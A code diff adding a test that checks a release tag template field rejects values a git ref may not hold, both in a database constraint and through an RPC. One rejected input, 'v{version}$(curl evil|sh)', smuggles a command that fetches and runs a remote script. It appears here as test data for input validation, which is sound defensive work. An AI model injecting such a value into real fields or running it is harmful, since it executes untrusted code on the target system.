@@ -162,6 +162,54 @@ test.describe('Release settings in the store', () => {
       expect(psql(good)).toBe('t');
     }
   });
+
+  test('a tag template holds only what a git ref may, however it is written', async () => {
+    const seed = await readSeedState();
+    const token = await passwordGrantToken(seed.userA);
+    const scope = await projectScope(token, `release-template-${Date.now()}`);
+    const db = asUser(token);
+
+    // Written directly, the table refuses it.
+    const direct = await db
+      .from('scope_release_settings')
+      .insert({ scope, tag_template: 'v{version}$(curl evil|sh)' });
+    expect(direct.error?.message).toMatch(/check constraint/u);
+
+    // Through the command, the refusal is an answer, and nothing is written.
+    for (const bad of [
+      'v{version}$(curl evil|sh)',
+      '-{version}',
+      'v{version}{version}',
+      `v{version}${'x'.repeat(100)}`,
+    ]) {
+      const refused = await rpc<{ error?: string }>(db, 'release_configure', {
+        p_scope: scope,
+        p_tag_template: bad,
+      });
+      expect(refused.error).toBe('invalid');
+    }
+    const nullPolicy = await rpc<{ error?: string }>(db, 'release_configure', {
+      p_scope: scope,
+      p_on_release: null,
+    });
+    expect(nullPolicy.error).toBe('invalid');
+    const none = await rpc<{ settings: unknown }>(db, 'release_settings', {
+      p_scope: scope,
+    });
+    expect(none.settings).toBeNull();
+
+    for (const good of ['release/{version}', 'v{version}-final', '{version}']) {
+      const set = await rpc<{ settings: { tag_template: string } }>(
+        db,
+        'release_configure',
+        {
+          p_scope: scope,
+          p_tag_template: good,
+        }
+      );
+      expect(set.settings.tag_template).toBe(good);
+    }
+  });
 });
 
 test.describe('Release commands in the store', () => {
